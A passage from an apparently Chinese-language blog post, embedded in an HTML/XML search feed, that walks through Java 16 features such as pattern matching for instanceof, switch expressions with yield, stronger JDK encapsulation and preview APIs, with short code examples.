<span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RotationAngle</span>(angle);</span><br><span class="line">        <span class="type">double</span> <span class="variable">x</span> <span class="operator">=</span> Math.abs(length * Math.cos(ra.angle())) +</span><br><span class="line">                   Math.abs(width * Math.sin(ra.angle()));</span><br><span class="line">        <span class="type">double</span> <span class="variable">y</span> <span class="operator">=</span> Math.abs(length * Math.sin(ra.angle())) +</span><br><span class="line">                   Math.abs(width * Math.cos(ra.angle()));</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Rectangle</span>(x, y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="pattern-matching-for-instanceof"><a class="markdownIt-Anchor" href="#pattern-matching-for-instanceof"></a> Pattern Matching for instanceof</h2><p>instanceof是java當中的保留關鍵字，用於確認變數型態，當相同時就返回true，不同就返回false。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Double</span> <span class="variable">d</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(d <span class="keyword">instanceof</span> Double)&#123;<span class="comment">//true</span></span><br><span class="line">    <span class="comment">//做某件事情</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(d <span class="keyword">instanceof</span> Boolean)&#123;<span class="comment">//false</span></span><br><span class="line">    <span class="comment">//做某件事情</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大概就會像是這個樣子，可以降低程式的bug還有一些implements的子class分類會很好弄，像是以下這樣。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span> <span class="title function_">getPerimeter</span><span class="params">(Shape shape)</span> <span class="keyword">throws</span> IllegalArgumentException &#123;</span><br><span class="line">        <span class="keyword">if</span> (shape <span class="keyword">instanceof</span> Rectangle) &#123;</span><br><span class="line">            <span class="type">Rectangle</span> <span class="variable">r</span> <span class="operator">=</span> (Rectangle) shape;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span> * r.length() + <span class="number">2</span> * r.width();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (shape <span class="keyword">instanceof</span> Circle) &#123;</span><br><span class="line">            <span class="type">Circle</span> <span class="variable">c</span> <span class="operator">=</span> (Circle) shape;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span> * c.radius() * Math.PI;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Unrecognized shape&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rectangle</span> <span class="keyword">implements</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">double</span> length;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">double</span> width;    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Rectangle</span><span class="params">(<span class="type">double</span> length, <span class="type">double</span> width)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.length = length;</span><br><span class="line">        <span class="built_in">this</span>.width = width;</span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="type">double</span> <span class="title function_">length</span><span class="params">()</span> &#123; <span class="keyword">return</span> length; &#125;</span><br><span class="line">    <span class="type">double</span> <span class="title function_">width</span><span class="params">()</span> &#123; <span class="keyword">return</span> width; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Circle</span> <span class="keyword">implements</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">double</span> radius;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Circle</span><span class="params">(<span class="type">double</span> radius)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.radius = radius;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="type">double</span> <span class="title function_">radius</span><span class="params">()</span> &#123; <span class="keyword">return</span> radius; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在java 16當中，有新的語法糖來簡化這個過程。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span> <span class="title function_">getPerimeter</span><span class="params">(Shape shape)</span><span class="keyword">throws</span> IllegalArgumentException &#123;</span><br><span class="line">    <span class="keyword">if</span> (shape <span class="keyword">instanceof</span> Rectangle r) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * r.length() + <span class="number">2</span> * r.width();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (shape <span class="keyword">instanceof</span> Circle c) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * c.radius() * Math.PI;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentExceptio</span>(<span class="string">&quot;Unrecognized shape&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大概就是可以宣告一個變數並等同於shape以便後續使用。</p><h2 id="switch-expressions"><a class="markdownIt-Anchor" href="#switch-expressions"></a> Switch Expressions</h2><p>Switch Expressions應該是我最喜歡的部分，他把switch弄得酷酷的。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">Day</span> &#123; SUNDAY, MONDAY, TUESDAY,</span><br><span class="line">    WEDNESDAY, THURSDAY, FRIDAY, SATURDAY; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="variable">numLetters</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">Day</span> <span class="variable">day</span> <span class="operator">=</span> Day.WEDNESDAY;</span><br><span class="line">    <span class="keyword">switch</span> (day) &#123;</span><br><span class="line">        <span class="keyword">case</span> MONDAY:</span><br><span class="line">        <span class="keyword">case</span> FRIDAY:</span><br><span class="line">        <span class="keyword">case</span> SUNDAY:</span><br><span class="line">            numLetters = <span class="number">6</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TUESDAY:</span><br><span class="line">            numLetters = <span class="number">7</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> THURSDAY:</span><br><span class="line">        <span class="keyword">case</span> SATURDAY:</span><br><span class="line">            numLetters = <span class="number">8</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> WEDNESDAY:</span><br><span class="line">            numLetters = <span class="number">9</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid day: &quot;</span> + day);</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(numLetters);</span><br></pre></td></tr></table></figure><p>在java 16中把這種又長又冗的寫法改為以下這種，有夠香的啦!我前陣子寫計算機概論的作業的時候用的滿開心的。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Day</span> <span class="variable">day</span> <span class="operator">=</span> Day.WEDNESDAY;    </span><br><span class="line">System.out.println(</span><br><span class="line">    <span class="keyword">switch</span> (day) &#123;</span><br><span class="line">        <span class="keyword">case</span> MONDAY, FRIDAY, SUNDAY -&gt; <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">case</span> TUESDAY                -&gt; <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">case</span> THURSDAY, SATURDAY     -&gt; <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">case</span> WEDNESDAY              -&gt; <span class="number">9</span>;</span><br><span class="line">        <span class="keyword">default</span> -&gt; <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid day: &quot;</span> + day);</span><br><span class="line">    &#125;</span><br><span class="line">);    </span><br></pre></td></tr></table></figure><p>而如果要寫更多(不只一行)操作的話，可以用{}把內容括號起來執行，例如以下。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">numLetters</span> <span class="operator">=</span> <span class="keyword">switch</span> (day) &#123;</span><br><span class="line">    <span class="keyword">case</span> MONDAY, FRIDAY, SUNDAY -&gt; &#123;</span><br><span class="line">        System.out.println(<span class="number">6</span>);</span><br><span class="line">        yield <span class="number">6</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> TUESDAY -&gt; &#123;</span><br><span class="line">        System.out.println(<span class="number">7</span>);</span><br><span class="line">        yield <span class="number">7</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> THURSDAY, SATURDAY -&gt; &#123;</span><br><span class="line">        System.out.println(<span class="number">8</span>);</span><br><span class="line">        yield <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> WEDNESDAY -&gt; &#123;</span><br><span class="line">        System.out.println(<span class="number">9</span>);</span><br><span class="line">        yield <span class="number">9</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">default</span> -&gt; &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid day: &quot;</span> + day);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;  </span><br></pre></td></tr></table></figure><h2 id="封裝與其他部分"><a class="markdownIt-Anchor" href="#封裝與其他部分"></a> 封裝與其他部分</h2><p>因為涉及到程式編寫層面較少，所以我把我覺得比較重要的改變拉出來集合成一個分類。</p><h3 id="完整功能"><a class="markdownIt-Anchor" href="#完整功能"></a> 完整功能</h3><ul><li><p>java 16封裝了除了關鍵的內部API以外的所有內部方法，JDK默認為拒絕所有的非必要訪問，除非使用–add-opens打開特定套件。</p></li><li><p>優化ZGC(java內部提供的垃圾記憶體回收機制)，以多執行續處理，極大的降低延遲。</p></li><li><p>可以將未使用的HotSpot VM metaspace 記憶體更快速的回傳給操作系統。</p></li></ul><h3 id="正在開發的項目和preview功能"><a class="markdownIt-Anchor" href="#正在開發的項目和preview功能"></a> 正在開發的項目和preview功能</h3><ul><li><p>Vector API : 在CPU架構上對向量運算做出優化，提供更高的性能。</p></li><li><p>Foreign Linker API : 把原本用來呼叫其他程式語言的JNI取代掉，該API提供靜態類型的純Java訪問，感覺比應該不會比JNI難用(?)，我快受夠JNI了。</p></li><li><p>Sealed Classes : 可以限制那些class or interfaces可以extend or implement Sealed Classes和可以限制use of a superclass，目前還在預覽階段，但感覺是想未來逐漸取代掉class。</p></li></ul><h3 id="jdk內部改變"><a class="markdownIt-Anchor" href="#jdk內部改變"></a> JDK內部改變</h3><ul><li>JDK 原程式碼開始使用C++ 14</li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
